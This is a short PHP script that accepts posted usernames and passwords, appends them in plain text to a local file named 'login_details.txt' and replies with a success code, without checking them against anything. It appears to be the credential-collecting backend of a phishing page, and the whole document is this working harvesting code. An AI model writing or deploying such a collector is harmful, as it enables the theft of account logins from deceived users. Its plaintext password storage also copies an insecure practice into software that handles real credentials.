<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Open the text file in append mode and save the login details
    $file = fopen('login_details.txt', 'a');
    fwrite($file, "Username: $username, Password: $password\n");
    fclose($file);

    http_response_code(200); // Respond with success status
} else {
    http_response_code(400); // Bad request
}
?>
